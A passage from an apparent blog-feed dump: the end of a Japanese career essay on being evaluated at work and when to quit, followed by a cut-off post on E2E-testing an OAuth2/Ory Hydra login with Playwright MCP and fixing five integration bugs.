ドベース、初対面のチームメンバー。その状況で出せるアウトプットが、あなたの「実力」として記録される。「本当はもっとできるんです」は通用しない。それは言い訳だ。今、目の前で出しているアウトプットが、あなたの実力として認識される。「体調が悪かったので」も通用しない。体調が悪い日も含めた平均が、あなたの実力だ。だから、自分の「下限」を正しく認識することが重要だ。自分が思っているよりも、自分の下限は低いだろう。他人から見えている自分は、自分が思っている自分とは違うだろう。このギャップを認識した上で、どう動くか。それが「構造を理解した上で頑張る」ということだ。チームを勝たせろここまで「やるべきこと」を書いてきた。ここで1つ、やらなくていいことを書く。「最高の人材はオールラウンダーである」——そう信じられている。でも、そもそもオールラウンダーは、組織が作り出した便利な幻想だ。能力は文脈の中にしか存在しない。「オールラウンダー」とは、会社が定義した評価項目の範囲内でバランスが良い、というだけの話だ。それは普遍的な能力ではなく、ある限定された文脈の中で複数の能力がそこそこ高いだけだ。オールラウンダーの罠でも、オールラウンダーを目指すと何が起きるか。どの分野でも「そこそこ」になります。よくある罠があります。評価面談で「コミュニケーション力が弱い」と言われて、無理に改善しようとします。勉強会で発表する練習をします。ファシリテーションの本を読みます。その結果、強みだった技術力を伸ばす時間が減ります。コミュニケーション力は「平均以下」から「平均」になっただけです。技術力は「突出」から「やや上」に落ちました。本末転倒です。弱みを平均まで引き上げる努力は、強みを突き抜けさせる努力より、はるかに効率が悪いです。100時間かけて弱みを「平均以下」から「平均」にするより、100時間かけて強みを「上位10%」から「上位1%」にする方が、価値が出ます。「チームを勝たせる」という発想ここで視点を変えてほしい。ここまで「上司を勝たせてください」と書いてきました。上司の目標に貢献してください。上司の労力を最小化してください。それがスポンサーを獲得し、評価につながる、と。でも、上司を勝たせることは、手段に過ぎません。本質は「チームを勝たせること」です。チームが勝てば、全員が恩恵を受けます。リソースが配分されます。良いプロジェクトが回ってきます。評価の枠が増えます。逆に、チームが負ければ、個人がどれだけ頑張っても報われません。沈む船の上でいくら走っても、沈むことに変わりはありません。だから、「自分がどう評価されるか」ではなく「チームがどう勝つか」を考えてください。強みで貢献するチームを勝たせるために、あなたは何ができるか。答えは単純です。強みで貢献してください。チームには様々な仕事があります。設計、実装、テスト、ドキュメント、調整、発表。全部を一人でやる必要はありません。チームとして、全部ができていればいいです。あなたがコードを書くのが得意なら、コードで貢献してください。ドキュメントが得意な人に、ドキュメントは任せてください。あなたが調整が得意なら、調整で貢献してください。実装が得意な人に、実装は任せてください。これが「補完」です。全員がオールラウンダーを目指すより、それぞれが強みを発揮して補完し合う方が、チームとしての出力は高くなります。優秀な人に共通パターンはありません。コードは神がかっているがドキュメントは壊滅的な人。設計は天才的だが実装は遅い人。トラブルシューティングは超人的だが新規開発には興味がない人。万能な人はいません。でも、チームとして万能であればいいです。弱みはチームでカバーする弱みを克服する必要がないと言っているわけではありません。弱みを自分で克服するか、チームでカバーするかを選んでください、と言っています。弱みを無視していいかどうかは、3つの質問で判断できます。その弱みがないと仕事ができないか？ コミュニケーションが苦手でも、コードで結果を出せるなら問題ありません。ですが、リーダーを目指すなら、コミュニケーションは避けられません。その弱みをカバーする人がチームにいるか？ ドキュメントが苦手でも、得意な人がチームにいれば補完できます。その弱みを平均にする努力で、強みを伸ばす時間が失われないか？ 弱みを平均にするのに100時間かかるなら、その100時間で強みを突き抜けさせた方がいいです。3つとも「いいえ」なら、弱みの克服は後回しでいいです。チームでカバーできる弱みは、チームに任せてください。しかし、役割によって「致命的な弱み」は変わります。今の役割では問題なくても、次の役割では致命的になることがあります。上司と話し合ってください。「私はAが強みで、Bが弱みです。今の役割でBは致命的ですか。次の役割ではどうですか」と。「この人がいないと困る」状態を作るチームを勝たせる中で、「この人がいないと困る」という状態を作ってください。みんなが平均を目指すなら、平均的な人材は溢れます。「そこそこ何でもできる人」は大量にいます。だから、差別化できません。代わりはいくらでもいます。一方、「この分野なら誰にも負けない」と言える人は少ないです。少ないから、価値があります。「この人じゃないと困る」という状況を作れます。それが交渉力になります。「パフォーマンスチューニングなら〇〇さん」「あの複雑な仕様を理解しているのは〇〇さんだけ」「障害対応で真っ先に呼ばれるのは〇〇さん」——こういうポジションを取ってください。チームの中で、代替不可能な存在になってください。「何でもできる人」という便利なラベルを捨ててください。代わりに、「〇〇の問題ならあいつに聞け」という、組織内の検索ワードを確立してください。検索ワードがあれば、困っている人が自分を見つけてくれます。仕事が向こうからやってきます。その仕事で成果を出せば、また検索ワードが強化されます。この循環を作ってください。そして、自分に問うてみてください。あなたの強みをより伸ばすことが、どのように「チーム全体の勝率」に直結するか。個人の成長と、チームの勝利を結びつけて説明できるか。「私が〇〇を極めれば、チームは△△で勝てるようになります」と。この論理が説明できれば、強みを伸ばす時間を堂々と確保できます。これは「自分だけが得をする」話ではありません。チームが勝つために、自分の強みを最大限に活かすという話です。チームが勝ち、その中で自分が不可欠な貢献をしている。この状態が、評価につながります。上司は言えます。「あのプロジェクトが成功したのは、〇〇さんの△△があったからです」と。具体的な貢献があれば、評価会議で名前を出しやすいです。組織の論理と個人の論理を重ねる組織は「オールラウンダーになれ」と言います。でも、その言葉を額面通りに受け取らないでください。組織が本当に求めているのは、「チームが勝つこと」です。オールラウンダーを求めるのは、そのための手段に過ぎません。誰が抜けてもチームが回るように、リスクヘッジしたいだけです。だから、「チームを勝たせる」という目的を共有した上で、手段は自分で選んでください。オールラウンダーになることでチームに貢献できるなら、それでいいです。でも、強みを尖らせることでチームに貢献できるなら、それでもいいです。目的が達成されていれば、手段は問われません。「私はオールラウンダーではありません。でも、この分野では誰にも負けません。チームの勝利に、この強みで貢献します」と言える状態を作ってください。組織の論理と、個人の論理を、「チームを勝たせる」という一点で重ねてください。これが、構造を理解した上で頑張る、ということです。それでもダメならここまでやっても評価されないことがあります。そのときの判断基準を明確にしておきます。「正しく頑張った」の定義成果を言語化し、見せた1on1で評価基準と昇進に必要なことを確認した上司の目標、チームの目標に貢献した評価のタイムラインを意識して動いたフィードバックを受け入れ、行動を変えた上司以外のスポンサーも獲得しようとした強みで貢献し、弱みはチームでカバーしたこの7つを1年間やった上で、評価が変わらなければ、構造の問題です。2年以上待っても変わらないなら、個人の努力では覆りません。しかし、正直に書いておきます。運の要素は大きいです。この記事は、努力すれば報われるかのように書いてきました。でも、現実はそうじゃありません。良い上司に当たるかどうかは、運です。自分の強みを評価してくれる上司、対話に応じてくれる上司、スポンサーになってくれる上司。そういう上司に当たるかどうかは、自分ではコントロールできません。良いプロジェクトに配属されるかも、運です。成果が見えやすいプロジェクト、評価につながりやすい仕事。それに関われるかどうかは、タイミングと巡り合わせです。会社の業績も、運です。会社が成長していれば昇進枠は増えます。会社が停滞していれば枠は減ります。個人の努力とは関係ありません。この記事に書いたことを全部やっても、運が悪ければ評価されません。逆に、何もしなくても、運が良ければ評価されます。そういうことは、あります。私が評価されるようになったのも、運の要素が大きいです。良い上司に当たりました。良いプロジェクトに関われました。会社の業績が良かった時期に、たまたま成果を出せました。努力したのは事実ですが、運が良かったのも事実です。この記事は、「努力でコントロールできる部分」にフォーカスしています。でも、コントロールできない部分の方が大きいでしょう。運が悪いときに、「頑張り方が間違っている」と言われても、救いになりません。運が悪かった人に、私は何も言えません。「次は運が良いといいね」としか言えません。それは無責任でしょうが、本当のことです。見切るべき3つのパターン パターン  状況  対処  上司とのズレ  上司が重視するAと、自分が得意なBがズレている。対話しても埋まらない  異動するか、別のスポンサーを見つける  制度の破綻  年功序列、政治、声の大きい人が勝つ。チームが勝っても個人に還元されない  組織を変えるか、出るか  市場価値との乖離  外では高く評価されるスキルが、今の組織では価値がない  辞める 見切りの解像度を上げろ「組織を辞める」というより、「この人たちと働くことを辞める」と考えた方が正確だ。冒頭で書いた。「どの会社で働くか」より「どのチームで働くか」が大事だと。会社全体がダメなのか、今いるチームがダメなのか。この見極めは重要だ。この上司との関係は修復可能か？別のチームに移れば解決するか？この会社の「誰か」に働きかければ変わるか？上司以外にスポンサーになってくれる人はいるか？全部試して、全部無理だった。そのとき初めて「構造の問題」と言える。あなたが直面している「評価への不満」は、個人の努力で突破可能な「運用上の課題」か。それとも、組織のDNAに刻まれた「構造的な腐敗」か。この見極めが重要です。1つの判断材料があります。過去3年間で、あなたと同じような「正論を吐く優秀な人」がどのように去っていったか、そのパターンを分析してください。同じパターンが繰り返されているなら、構造の問題です。もう1つの判断材料があります。今の会社で「最も高く評価されている人」の振る舞いは、あなたが5年後に「なりたい姿」と重なるか。重ならないなら、この組織で評価されることに意味があるのか。経営陣が「評価制度の不備」を認識していながら変えないなら、それは彼らにとって「都合が良い」からでしょう。仕組みの問題か、人の問題か「評価制度を変えればいい」——そう思いがちです。でも、制度を変えても、運用する人が変わらなければ、結果は変わりません。本当の問題は、制度ではなく、人と人の関係性にあることが多いです。逆もあります。「この上司が悪い」と思っていても、制度が上司にそう振る舞わせている場合があります。上司も構造の中で動いています。上司を責めても、構造は変わりません。撤退は戦略だ構造的な問題がある場合、とっとと辞めてください。「変われない組織」には共通パターンがあります。正しく頑張っても報われない構造ができあがっています。仕事が見えなくなり、提案が通らなくなり、評価基準が不透明になり、変えようとする人が去っていきます。こうなった組織は、個人の努力では変えられません。見極めのサインあなたの組織がこの状態に陥っているかどうか、いくつかのサインがあります。「これ、誰の仕事？」という会話が週に何度もある障害を未然に防いでも誰も気づかない提案しても「今は優先度が低い」と言われ続ける「なぜこのプロセス？」に「昔からこう」と返ってくる「変えようとして辞めた人」の話をよく聞くチームが勝っても、個人の評価に反映されないこれらのサインが複数当てはまるなら、個人の努力で変えるのは難しいです。異動か転職を視野に入れてください。成功した組織ほど変われなくなる皮肉なことに、成功した組織ほど変われなくなります。「過去にこうやってうまくいった」という経験が、新しいやり方を排除します。成功体験が足かせになります。あなたが「この組織はおかしい」と感じるとき、それは正しいでしょう。組織は過去の成功に縛られて、新しい環境に適応できなくなっているのでしょう。その場合、あなた個人が変えられることは限られています。構造を変えるには、経営層が本気で取り組む必要があります。それがないなら、辞めてください。撤退は戦略である「おい、辞めるな」で書きました。短期ではなく長期で考えてください。信頼の貯金を積み上げてください。転職はリセットコストがかかります。でも、「長期で考えた結果、辞める」という判断もあります。1年間正しく頑張りました。構造を理解した上で動きました。対話を試みました。スポンサーを探しました。チームを勝たせようとしました。それでも変わりませんでした。組織が考える力を失っていて、経営層も本気で取り組む気配がありません。そういう状況なら、辞めることが長期的に正しい判断です。それは逃げではありません。戦略的撤退です。交渉してダメなら去るしかし、順番を間違えないでください。まず交渉してください。評価に納得がいかないなら、上司に聞いてください。「何をすれば評価されるのか」を明確にしてください。構造に問題があると思うなら、提案してください。改善案を出してください。異動を申し出てください。別のスポンサーを探してください。やれることをやってください。交渉するとき、あなたの言葉に「重み」はありますか。社外の市場価値を把握していますか。「いつでも外に出られる」という自信が、言葉に重みを与えます。交渉するなら、「何を、いつまでに、どう変えてほしいか」を具体的に伝えてください。そして、交渉が決裂した際の「プランB」は準備していますか。プランBがないまま交渉しても、本気度が伝わりません。それでダメなら、去ってください。この順番が大事です。交渉せずに辞めるのは、ただの逃げです。でも、交渉した上で辞めるのは、戦略です。「やることはやった。それでも変わらなかった」という事実が、あなたの判断を正当化します。次の面接で「なぜ辞めたのか」と聞かれたとき、「改善を試みたが、構造的に無理だった」と言えます。というか、交渉するというのは、それぐらいデカいことです。「評価に納得いきません」「異動させてください」「この構造を変えてください」——これを口にした時点で、あなたは覚悟を示しています。ダメだったら去る覚悟を。交渉とは、そういう重さを持つ行為です。軽い気持ちで切り出すものではありません。だからこそ、ダメだったときに居座るのは筋が通りません。覚悟を示しておいて、結果が出たら何もしない。それは自分の言葉を裏切ることです。全てはトレードオフです。残るコストと、去るコストがあります。残れば、信頼の貯金を積み上げられます。人間関係もリセットされません。でも、構造が変わらないなら、消耗し続けます。3年後も5年後も同じ愚痴を言っている自分が見えます。去れば、リセットコストがかかります。また一から信頼を築く必要があります。新しい環境に適応するストレスもあります。でも、正しく評価される構造の中で働ける可能性があります。どちらが正解か、一般論では言えません。あなたの状況によります。あなたの価値観によります。あなたのキャリアのフェーズによります。ただ、1つだけ言えます。交渉してダメだったのに居座り続けるのは、最悪の選択です。構造が変わらないと分かりました。自分の力では変えられないと確認しました。それでも残る。それは「判断を放棄している」だけです。答えは出ているのに、行動しません。時間だけが過ぎていきます。交渉してください。ダメなら去ってください。それがトレードオフを引き受けるということです。辞める前に確認することしかし、辞める前に確認すべきことがあります。1. 本当に構造の問題か「評価されない」と感じるとき、構造のせいにしたくなります。自分のせいではない。組織が悪い。そう思いたいです。でも、まず自分を疑ってください。ちゃんと見せていたか。対話していたか。チームを勝たせようとしていたか。強みで貢献していたか。これらを本当にやった上で、評価されなかったのか。構造のせいにするのは、自分の責任を回避できて楽です。でも、構造のせいにして辞めても、次の組織で同じことが起きるでしょう。2. 異動で解決できないか「組織を辞める」前に、「チームを辞める」を検討してください。別のチームに移れば解決することがあります。上司が変われば、評価が変わることがあります。別のスポンサーがいれば、状況が変わることがあります。会社全体がダメなのか、今いるチームがダメなのか。この見極めは重要です。3. 辞めた後に何があるか辞めることを決める前に、辞めた後の絵を描いてください。「ここから出たい」だけでは、どこに行っても同じ問題にぶつかります。次の組織で何をしたいのか。どんな環境なら自分の強みを活かせるのか。どんなチームなら自分が貢献できるのか。それが見えてから、辞めてください。大企業にいるなら、よく考えろあなたは自分が持っているものを過小評価しています。 安定した給与、福利厚生、開発環境、ネームバリュー。これらが「普通」に感じられています。不満ばかりが目につきます。でも、構造的な問題——評価制度の限界、政治、見えない仕事の軽視——は、大企業だから存在するのではありません。組織という形態が持つ宿命です。スタートアップでも20人を超えれば政治が生まれます。50人を超えれば部門間の壁ができます。環境を変えても、構造は変わりません。大企業を辞める前に、まず異動を検討してください。辞めなくても環境を変えられます。サバンナで戦う覚悟があるなら飛び出せばいいです。覚悟がないなら、城壁の中で戦略を練ってください。辞めると決めたら辞めると決めたら、長居しないでください。「あと半年頑張ってみよう」「プロジェクトが終わるまで」と思いがちです。でも、辞めると決めた組織で頑張り続けるのは、消耗します。モチベーションが上がりません。パフォーマンスが落ちます。評価が下がります。悪循環にハマります。辞めると決めたら、次を探し始めてください。時間をかけすぎないでください。辞めても何も変わらないだろう正直に言えば、辞めても何も変わらないでしょう。次の組織も、同じような問題を抱えているでしょう。評価制度に限界があります。上司との相性があります。政治があります。これは、どの組織にもあります。というかそれはあなたの問題でもあります。そこに向き合ったほうが良いです。転職は、問題を解決する魔法ではありません。環境を変えるだけです。新しい環境で、同じ問題に別の形でぶつかることもあります。だから、辞める前に、「この問題は環境を変えれば解決するのか、自分が変わらないと解決しないのか」を考えてください。環境の問題なら、辞めてください。自分の問題なら、自分を変えてください。両方なら、両方やってください。届かない人へここまで書いてきて、立ち止まります。「見せてください」「対話してください」「チームを勝たせてください」——私はそう書きました。構造を理解した上で、その中でうまくやってください、と。でも、この記事が届かない人がいます。頑張れない人がいる「頑張り方を変えてください」と言いました。ですが、もう頑張る余力がない人はどうするのか。すでに消耗している人。毎日出社するだけで精一杯の人。週次報告に「何が難しかったか」を1文追加する気力すらない人。1on1で交渉する心理的余裕がない人。彼らに「見せてください」「対話してください」と言っても、届きません。むしろ、「お前の頑張りは間違っている」と告げることになります。追い詰めることになります。「体調管理は評価に直結する」と書きました。事実です。でも、体調を管理できない人がいます。慢性疾患を抱えている人。精神疾患と付き合っている人。家庭の事情で睡眠時間を削らざるを得ない人。介護や育児で「安定して稼働」できない人。彼らは、努力が足りないのではありません。構造が彼らを排除しているのです。「アピールが苦手なら、存在しないのと同じだ」と書きました。ですが、アピールが苦手な人は、苦手だから苦労しています。「苦手を克服してください」と言うのは簡単です。でも、克服できないから苦手なのです。内向的な人、言語化が苦手な人、自己主張に強い抵抗がある人。彼らに「見せてください」と言っても、できないものはできません。この記事に書いた「正しい頑張り方」ができる人は、すでに恵まれています。対話する余力があります。アピールする能力があります。安定して稼働できる体があります。それらを持っている時点で、スタートラインが違います。私は、持っている側でした。だから、この記事を書けました。持っていない人に、同じことを求めるのは、傲慢でしょう。「頑張らない」という選択肢「辞めないなら頑張ってください」と書きました。ですが、「辞めないけど頑張らない」という選択肢もあります。昇進を追わない。評価を気にしない。自分のペースで働く。それは「諦め」ではありません。評価ゲームから意識的に降りるという戦略です。評価制度は、組織が作ったゲームに過ぎません。そのゲームに参加するかどうかは、自分で選べます。「昇進しなければ給料が上がらない」と言うでしょう。ですが、昇進のために消耗して、心身を壊したら、給料どころではありません。評価を追いかけて、本来の仕事の楽しさを失ったら、何のために働いているのか分からなくなります。評価されなくても、良い仕事はできます。障害を未然に防いだ本人は、その価値を知っています。上司が知らなくても、自分は知っています。それで十分だと思える人もいます。もし今の評価ゲームが「勝てない設定」であるなら、「頑張らない」ことで確保したエネルギーを、どこに投資するか考えてみてください。社内の評価を「食い扶持を維持する程度」にコントロールし、余ったリソースで社外での市場価値を育てることは可能か。今の場所を「人生のゴール」ではなく「ベースキャンプ」と定義し直してください。もちろん、評価されないと生活に困ることもあります。だから、全員にこの選択肢を勧めているわけではありません。ただ、「頑張らない」という選択肢もあることを、知っておいてほしいです。評価ゲームに全てを賭ける必要はありません。降りてもいいです。構造を変えるという選択肢「仕組みは変えられない。自分は変えられる」と書きました。ですが、本当に変えられないのか。「見えない仕事」を評価する仕組みを作った組織はあります。障害を未然に防いだことを、きちんと評価する制度を設計した会社はあります。短期成果だけでなく、長期的な貢献を測る仕組みを導入したチームはあります。変えられないのではありません。変えようとする人がいなかっただけでしょう。変えようとした人が、諦めて辞めていっただけでしょう。この記事では、構造を変える方法は書きませんでした。正直、私にはその経験がないからです。私は構造の中で適応する方を選んできました。変えようとしたこともありますが、うまくいきませんでした。だから、「変えてください」とは言えませんでした。でも、適応することが唯一の選択肢ではありません。もしあなたに発言力があるなら、提案してみてもいいです。評価制度を変える提案。見えない仕事を可視化する仕組み。非機能要件を評価する基準。障害を未然に防いだことを記録するプロセス。変わらないでしょう。でも、変わるでしょう。少なくとも、試さなければ分かりません。「構造を理解した上で適応する」は、1つの戦略です。でも、「構造を理解した上で変えようとする」も、1つの戦略です。どちらを選ぶかは、あなた次第です。多様な「正解」があるこの記事は、「評価される頑張り方」を書きました。ですが、それが唯一の正解ではありません。評価を追いかけて、昇進して、影響力を持つ。それも正解です。評価を諦めて、自分のペースで働く。それも正解です。構造を変えようとして、組織を動かす。それも正解です。評価ゲームから降りて、別の働き方を選ぶ。それも正解です。どれが正しいかは、あなたの状況によります。あなたの価値観によります。あなたの人生のフェーズによります。「辞めないなら頑張ってください」と私は書きました。でも、「辞めないけど頑張らない」でもいいです。「辞めないで、構造を変えようとする」でもいいです。この記事が、あなたを追い詰めるためにあるのではありません。選択肢を増やすためにあります。そう思いたいです。おわりに先週の記事に、思った以上の反響がありました。「辞めないことにしました」という連絡をくれた人たちが、どんな人で今どうしているのか、私は知りません。うまくいっているといいです。うまくいっていなくても、間違えながら何とかやっているといいです。この文章を書き終えました。書いている間、何度か手が止まりました。こんなことを書いて、誰かの役に立つのだろうか。自分が経験したことを、他人に押し付けているだけではないか。答えは出ませんでした。出ないまま、最後まで書きました。明日からできることはあります。週次報告に「何が難しかったか」を1文足す。1on1で「昇進に必要なこと」を聞く。カレンダーに「評価2ヶ月前」をマークする。見えない仕事を、見える形にする。それだけで、何かが変わるでしょう。たぶん、私は来週の週次報告で「何が難しかったか」を書くのを忘れます。上司を敵認定しそうになります。また同じ愚痴を居酒屋で言います。間違えたら直せばいいです。間違えていることに気づいているなら、まだやれます。たぶん。「評価が上がりました」でも、「やっぱり辞めました」でも、「まだ間違え続けています」でも、「頑張るのをやめました」でも。どれでもいいです。どれも、選んだ道を歩いている証拠だと思うから。正解かどうかは、分かりません。私がやってきたことが正しかったかどうかも、分かりません。分かるのは、ずっと後になってからです。おい、辞めないなら頑張ってください。頑張り方を間違えないでください。——と、ここまで書いてきました。でも、最後に付け加えておきます。頑張れないなら、頑張らなくていいです。降りてもいいです。休んでもいいです。それも、1つの選択です。私も、まだ間違え続けています。それでいいのだと思います。参考書籍外資系コンサルの仕事の進め方: 実践の場で使える問題解決の基盤スキル作者:金地 毅,田辺 元,柳田 拓未東洋経済新報社Amazon私文ホワイトカラーが AI・コンサルに仕事を奪われない働き方戦略作者:株式会社板橋　東京中央支店かんき出版AmazonSOFT SKILLS ソフトウェア開発者の人生マニュアル 第2版作者:ジョン・ソンメズ日経BPAmazon社内政治の科学　経営学の研究成果 (日本経済新聞出版)作者:木村琢磨日経BPAmazon社内政治の教科書作者:高城 幸司ダイヤモンド社AmazonHigh Conflict よい対立 悪い対立 世界を二極化させないために作者:アマンダ・リプリーディスカヴァー・トゥエンティワンAmazonTHE CULTURE CODE 最強チームをつくる方法作者:ダニエル・コイル,楠木建かんき出版Amazonセンスメイキング――本当に重要なものを見極める力作者:クリスチャン・マスビアウプレジデント社Amazon心眼：あなたは見ているようで見ていない作者:クリスチャン・マスビアウ Christian Madsjergプレジデント社Amazon組織と働き方の本質　迫る社会的要請に振り回されない視座 (日本経済新聞出版)作者:小笹芳央日経BPAmazon［新版］組織行動の考え方―個人と組織と社会に元気を届ける実践知作者:金井 壽宏,高橋 潔,服部 泰宏東洋経済新報社Amazon「組織と人数」の絶対法則―人間関係を支配する「ダンバー数」のすごい力作者:トレイシー・カミレッリ,サマンサ・ロッキー,ロビン・ダンバー東洋経済新報社Amazonチームの力で組織を動かす 〜ソフトウェア開発を加速するチーム指向の組織設計作者:松本 成幸技術評論社Amazon恐れのない組織――「心理的安全性」が学習・イノベーション・成長をもたらす作者:エイミー・C・エドモンドソン,村瀬俊朗英治出版Amazon他者と働く──「わかりあえなさ」から始める組織論 (NewsPicksパブリッシング)作者:宇田川元一ニューズピックスAmazon組織が変わる――行き詰まりから一歩抜け出す対話の方法2 on 2作者:宇田川 元一ダイヤモンド社Amazon多様性の科学作者:マシュー・サイドディスカヴァー・トゥエンティワンAmazon新　失敗学　正解をつくる技術作者:畑村洋太郎講談社Amazon企業変革のジレンマ　「構造的無能化」はなぜ起きるのか (日本経済新聞出版)作者:宇田川元一日経BPAmazon「わかりあえない」を越える――目の前のつながりから、共に未来をつくるコミュニケーション・NVC作者:マーシャル・B・ローゼンバーグ海士の風Amazonみんな違う。それでも、チームで仕事を進めるために大切なこと。作者:岩井俊憲ディスカヴァー・トゥエンティワンAmazonなぜ働く？　誰と働く？　いつまで働く？　限られた人生で後悔ない仕事をするための20の心得作者:有山 徹アスコムAmazon問いかける技術――確かな人間関係と優れた組織をつくる作者:エドガー・H・シャイン英治出版Amazon","isoDate":"2026-01-11T15:30:13.000Z","dateMiliSeconds":1768145413000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"OAuth2認証をE2Eテストしたら、5つのバグが出てきた話","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/11/064311","contentSnippet":"はじめに認証が動いた。だがそれは始まりに過ぎなかった。前回の記事では、Next.jsでOry Hydra認証を実装した。OAuth2認可コードフロー、Cookie管理、ID Token署名検証、マルチテナント認証について解説した。前提知識: この記事は前回の記事の続編です。Next.jsでのOAuth2認証フロー実装を理解している前提で進めます。Next.jsでOry Hydra認証を実装する ― マルチテナントSaaSでの実践 - じゃあ、おうちで学べる今回は、実装した認証フローを検証する。Playwright MCPを使ったE2Eテスト、発見した5つのバグ、RBACの検証、そしてベストプラクティスとの比較までを一気に解説する。Playwright MCPによるE2Eテストもう本当に10年くらい前は「E2Eテストなんて、デモ前に手動で確認すれば十分でしょ」と思っていた。仕事でフロントエンド書いたことなかったので…。今の自分から言わせてもらえば、それは個人の能力を過信している。あとはフロントエンドのテストの大変さを軽く見ている。OAuth2フローのE2Eテストは手動では破綻する。複数のリダイレクト、Cookie管理、セッション状態の確認——これらを毎回手動で確認するのは、人間の注意力の限界を超えている。「今日は疲れていたから見落とした」で本番障害が起きるのは、個人の問題ではなく構造的な失敗だ。人間に頼らない仕組みを作る必要がある。Claude CodeとPlaywright MCPの組み合わせPlaywright MCPは、LLMがブラウザを直接操作できるModel Context Protocol（MCP）サーバーだ。Claude Codeと組み合わせることで、自然言語でE2Eテストを実行できる。従来のPlaywrightとの違いは、スクリプトを書かずにテストできる点だ。# セットアップ（プロジェクトごとに一度だけ）claude mcp add --transport stdio playwright --scope project -- npx -y @playwright/mcp@latest.mcp.jsonが生成される：{  \\"mcpServers\\": {    \\"playwright\\": {      \\"type\\": \\"stdio\\",      \\"command\\": \\"npx\\",      \\"args\\": [\\"-y\\", \\"@playwright/mcp@latest\\"]    }  }}実際のテスト実行例Claude Codeで以下のように指示する：Playwright MCPでOAuth2フローをE2Eテストしてください：1. http://localhost:3001/ にアクセス2. Sign Inをクリック3. demo@example.com / password123 でログイン4. Consentで Allow をクリック5. ダッシュボードが表示されることを確認6. スクリーンショットを取得Claude Codeは以下のツールを順次実行する： ステップ  MCPツール  結果  1  browser_navigate  ホームページ表示  2  browser_click (ref=e10)  Hydra認可エンドポイントへリダイレクト  3  browser_fill_form  ログインフォーム入力完了  4  browser_click (Sign In)  Consent画面へリダイレクト  5  browser_click (Allow)  トークン交換・フロントエンドへリダイレクト  6  browser_take_screenshot  エビデンス取得 ARIA Snapshotの活用Playwright MCPの特徴は、DOMではなくアクセシビリティツリーでページ構造を表現する点だ。各要素にはref=eXX形式の参照IDが付与される：- banner:  - navigation:    - link \\"Sign In\\" [ref=e10] [cursor=pointer]:      - /url: /api/auth/loginこのref=e10を使ってクリック対象を指定する。セレクタの管理が不要になり、UIの変更に強いテストが書ける。従来のE2Eテストとの比較 項目  従来のPlaywright  Playwright MCP  テスト作成  スクリプト記述が必要  自然言語で指示  セレクタ管理  CSSセレクタ/XPath  ARIA参照ID  リダイレクト追跡  手動でwait設定  自動追跡  デバッグ  ログ/スクリーンショット  対話的に確認可能  再現性  高（スクリプト化）  中（LLMに依存） Playwright MCPは「探索的テスト」に向いている。本番のCIには従来のPlaywrightスクリプトを使い、開発中の手動確認をPlaywright MCPで効率化する、という使い分けがよさそうだ。E2Eテストで発見した5つのバグPlaywright MCPとシェルスクリプトによるE2Eテストを実行した結果、5つの重要なバグを発見・修正した。OAuth2+マルチテナント構成の複雑さを示す良い事例だ。バグ1：CORS設定の欠如症状：フロントエンド（localhost:3001）からバックエンド（localhost:3000）へのAPIリクエストがブロックされる原因：Axumルーターにtower-httpのCorsLayerが設定されていなかった修正（src/main.rs）：use tower_http::cors::{Any, CorsLayer};let app = Router::new()    // ... routes ...    .layer(        CorsLayer::new()            .allow_origin(Any)            .allow_methods(Any)            .allow_headers(Any),    )教訓：これは個人の注意力の問題ではない。フロントエンド・バックエンド分離構成では、CORSは「設定を忘れると動かない」構造になっている。チェックリストに入れる。プロジェクトテンプレートに含める。人間の記憶に頼らない仕組みを作る。「動かない」の原因がCORSだと気づくまでに時間がかかることがある。エラーメッセージが分かりにくいからだ。ブラウザのコンソールを見る習慣をつけるしかない。詳細はMDN: CORSを参照。バグ2：Cookieパース時のJWTトークン切り詰め症状：認証後のAPIリクエストで401エラーが発生原因：.split(\\"=\\")[1]でCookieを取得すると、base64エンコードされたJWTの=パディング文字で切れてしまう// ❌ 危険：JWTが途中で切れるconst token = document.cookie  .split(\\"; \\")  .find((row) => row.startsWith(\\"auth_token=\\"))  ?.split(\\"=\\")[1];  // \\"ory_at_abc...def=\\" → \\"ory_at_abc...def\\" で切れる// ✅ 正しい：トークン全体を取得const cookieRow = document.cookie  .split(\\"; \\")  .find((row) => row.startsWith(\\"auth_token=\\"));const token = cookieRow ? cookieRow.substring(\\"auth_token=\\".length) : null;教訓：JWTは必ずbase64パディング（=）を含む可能性がある。文字列操作でトークンを扱う時は要注意。バグ3：HydraトークンとJWTの不一致症状：フロントエンドからのAPIリクエストで401エラー。curlでJWTを直接送ると成功する。原因：- フロントエンドはHydra発行のアクセストークン（ory_at_...形式）を使用- バックエンドは自前のJWTのみ対応していた修正（src/middleware/auth.rs）：// JWT検証を試み、失敗したらHydraイントロスペクションにフォールバックlet claims = match state.jwt.verify_access_token(token) {    Ok(claims) => claims,    Err(_) => {        // Hydra Admin APIでトークンを検証        let introspection = state.hydra.introspect_token(token).await?;        // IntrospectionResponseからClaimsに変換        Claims::from(introspection)    }};教訓：OAuth2プロバイダー（Hydra）のトークンと自前JWTの両方をサポートするか、どちらか一方に統一するか、設計段階で決めておくべきだった。バグ4：テナント抽出ミドルウェアの欠如症状：テナントAPI（/api/v1/tenant/*）で「No tenant context」エラー原因：tenant_apiルーターにextract_tenantミドルウェアが適用されていなかった修正（src/main.rs）：let tenant_api = Router::new()    // ... routes ...    .layer(axum_middleware::from_fn_with_state(        state.clone(),        middleware::require_auth,    ))    .layer(axum_middleware::from_fn_with_state(        state.clone(),        middleware::extract_tenant,  // 追加    ));教訓：ミドルウェアの適用漏れは見つけにくい。各ルートグループに必要なミドルウェアをリスト化しておくとよい。バグ5：X-Tenant-Slugヘッダーの欠如症状：ローカル開発環境でテナントが識別できない原因：- 本番環境ではサブドメイン（tenant-a.example.com）でテナント識別- ローカル開発ではlocalhost:3001のためサブドメインが使えない- フロントエンドがX-Tenant-Slugヘッダーを送信していなかった修正（frontend/src/lib/api.ts）：class ApiClient {  private tenantSlug: string = \\"test-shop\\"; // デフォルトテナント  private async fetch<T>(endpoint: string, options: RequestInit = {}): Promise<T> {    const headers: HeadersInit = {      \\"Content-Type\\": \\"application/json\\",      \\"X-Tenant-Slug\\": this.tenantSlug,  // 追加      ...options.headers,    };    // ...  }}教訓：マルチテナントのテナント識別は、サブドメイン方式とヘッダー方式の両方をサポートしておくとローカル開発が楽になる。E2Eテスト実行結果修正後のOAuth2フロー完全テスト：=== DONADONA E2E Test v4 ===1. Starting OAuth2 Flow...   Login Challenge: LuAyzZfWTX03DnVcFC1xu0A-rntZcx...2. Submitting Login (demo@example.com)...   Consent Challenge obtained3. Approving Consent...   Final: 